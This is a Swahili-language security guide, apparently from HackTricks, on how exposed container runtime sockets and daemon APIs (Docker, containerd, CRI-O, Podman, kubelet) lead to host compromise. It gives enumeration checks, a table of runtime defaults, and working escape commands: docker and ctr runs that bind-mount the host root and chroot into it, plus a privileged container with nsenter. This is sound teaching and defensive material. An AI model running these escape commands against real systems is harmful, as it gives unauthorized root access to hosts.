# API ya Runtime na Kufichuka kwa Daemon

{{#include ../../../banners/hacktricks-training.md}}

## Muhtasari

Mengi ya udukuzi halisi wa container hayaanzi kabisa kwa kutoroka kwa namespace. Huanza kwa kupata ufikiaji wa control plane ya runtime. Ikiwa workload inaweza kuzungumza na `dockerd`, `containerd`, CRI-O, Podman, au kubelet kupitia Unix socket iliyopakiwa au TCP listener iliyo wazi, mshambuliaji anaweza kuomba container mpya yenye vibali bora, kupakia filesystem ya host, kujiunga na namespaces za host, au kupata taarifa nyeti za node. Katika kesi hizo, API ya runtime ndiyo mpaka halisi wa usalama, na kuiharibu kwa vitendo ni karibu na kuiharibu host.

Hii ndiyo sababu kufichuka kwa runtime socket kunapaswa kuandikishwa tofauti na ulinzi wa kernel. Container yenye seccomp ya kawaida, capabilities, na MAC confinement bado inaweza kuwa umbali wa wito mmoja wa API kutoka kwa kuharibika kwa host ikiwa `/var/run/docker.sock` au `/run/containerd/containerd.sock` imepakiwa ndani yake. Utoaji wa kernel wa isolation wa container ya sasa unaweza kuwa unafanya kazi kama ilivyokusudiwa wakati management plane ya runtime inabaki wazi kabisa.

## Miundo ya Upatikanaji wa Daemon

Docker Engine kwa kawaida inaonyesha API yake yenye vigezo kupitia local Unix socket `unix:///var/run/docker.sock`. Kihistoria pia imekuwa ikifichuka kwa mbali kupitia TCP listeners kama `tcp://0.0.0.0:2375` au listener iliyo na TLS kwenye `2376`. Kufichua daemon kwa mbali bila TLS thabiti na uthibitishaji wa mteja kwa ufanisi hubadilisha Docker API kuwa interface ya root ya mbali.

containerd, CRI-O, Podman, na kubelet zinaonyesha uso wa athari kubwa sawa. Majina na workflows zinatofautiana, lakini mantiki haibadiliki. Ikiwa interface inaruhusu muombaji kuunda workloads, kupakia host paths, kupata credentials, au kubadilisha containers zinazoendesha, interface ni channel ya usimamizi yenye vigezo na inapaswa kutendewa ipasavyo.

Njia za ndani za kawaida zinazostahili kukaguliwa ni:
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```
Mifumo ya zamani au mahususi pia inaweza kufichua endpoints kama `dockershim.sock`, `frakti.sock`, au `rktlet.sock`. Hizo hazijaenea sana katika mazingira ya kisasa, lakini zinapokumbana nazo zinapaswa kutendewa kwa tahadhari ile ile kwani zinawakilisha uso wa udhibiti wa runtime badala ya sockets za kawaida za programu.

## Ufikiaji wa Mbali Salama

Iwapo daemon lazima ifichuliwe zaidi ya socket ya ndani, muunganisho unapaswa kulindwa kwa TLS na ikiwezekana kwa uthibitishaji wa pande zote ili daemon ithibitishe client na client ithibitishe daemon. Tabia ya zamani ya kufungua Docker daemon kwa HTTP ya wazi kwa urahisi ni moja ya makosa hatari zaidi katika usimamizi wa container kwa sababu uso wa API ni mkubwa vya kutosha kuunda containers zilizo na ruhusa za juu moja kwa moja.

Mfano wa kihistoria wa usanidi wa Docker ulikuwa kama ifuatavyo:
```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```
Kwenye systemd-based hosts, mawasiliano ya daemon yanaweza pia kuonekana kama `fd://`, ikimaanisha mchakato unarithi pre-opened socket kutoka systemd badala ya kuibind moja kwa moja. Somo muhimu si syntax kamili bali matokeo ya usalama. Mara daemon inaposikiliza zaidi ya local socket yenye ruhusa kali, transport security na client authentication zinakuwa lazima badala ya optional hardening.

## Abuse

Ikiwa runtime socket ipo, thibitisha ni ipi, kama kuna compatible client, na ikiwa raw HTTP au gRPC access inawezekana:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
```
Amri hizi ni muhimu kwa sababu zinaweza kutofautisha kati ya dead path, socket iliyomingwa lakini isiyoweza kufikiwa, na live privileged API. Ikiwa client inafanikiwa, swali linalofuata ni kama API inaweza kuanzisha container mpya yenye host bind mount au host namespace sharing.

### Mfano Kamili: Docker Socket To Host Root

Ikiwa `docker.sock` inapatikana, njia ya kawaida ya kutoroka ni kuanzisha container mpya inayomount host root filesystem kisha `chroot` ndani yake:
```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```
Hii inatoa direct host-root execution kupitia Docker daemon. Athari sio tu kwa file reads. Mara tu ndani ya new container, attacker anaweza alter host files, harvest credentials, implant persistence, au start additional privileged workloads.

### Full Example: Docker Socket To Host Namespaces

Ikiwa attacker anapendelea namespace entry badala ya filesystem-only access:
```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```
Njia hii inafikia host kwa kumuomba runtime kuunda container mpya yenye kufunuliwa wazi kwa host-namespace, badala ya exploiting ile iliyopo.

### Mfano Kamili: containerd Socket

Socket ya `containerd` iliyopachikwa mara nyingi pia ni hatari kama hiyo:
```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```
Athari ni tena host compromise. Hata kama Docker-specific tooling haipo, runtime API nyingine bado inaweza kutoa nguvu za utawala sawa.

## Mikaguzi

Lengo la mikaguzi hii ni kujibu ikiwa container inaweza kufikia management plane yoyote ambayo ingepaswa kubaki nje ya trust boundary.
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE'
```
Kinachovutia hapa:

- Socket ya runtime iliyopachikwa kwa kawaida ni primitive ya moja kwa moja ya kiutawala badala ya ufunuo wa taarifa pekee.
- Kimsikilizo cha TCP kwenye `2375` bila TLS kinapaswa kutumiwa kama hali ya u-kompromisi wa mbali.
- Mabadiliko ya mazingira kama `DOCKER_HOST` mara nyingi yanaonyesha kuwa workload ilibuniwa kwa makusudi kuzungumza na host runtime.

## Chaguo-msingi za Runtime

| Runtime / platform | Hali ya chaguo-msingi | Tabia ya chaguo-msingi | Udhoofishaji wa kawaida kwa mkono |
| --- | --- | --- | --- |
| Docker Engine | Local Unix socket by default | `dockerd` husikiliza kwenye socket ya ndani na daemon kawaida huendeshwa na root | mounting `/var/run/docker.sock`, exposing `tcp://...:2375`, weak or missing TLS on `2376` |
| Podman | Daemonless CLI by default | Hakuna daemon mwenye ruhusa ya kuishi kwa muda mrefu unaohitajika kwa matumizi ya kawaida ya ndani; API sockets bado zinaweza kufichuliwa wakati `podman system service` imewezeshwa | exposing `podman.sock`, running the service broadly, rootful API use |
| containerd | Local privileged socket | Administrative API imefunuliwa kupitia socket ya ndani na kawaida hutumiwa na tooling ya ngazi ya juu | mounting `containerd.sock`, broad `ctr` or `nerdctl` access, exposing privileged namespaces |
| CRI-O | Local privileged socket | Endpoint ya CRI imekusudiwa kwa vipengele vinavyoaminika vya node-local | mounting `crio.sock`, exposing the CRI endpoint to untrusted workloads |
| Kubernetes kubelet | Node-local management API | Kubelet haipaswi kufikiwa kwa upana kutoka kwa Pods; ufikiaji unaweza kufichua hali ya pod, credentials, na vipengele vya utekelezaji kulingana na authn/authz | mounting kubelet sockets or certs, weak kubelet auth, host networking plus reachable kubelet endpoint |
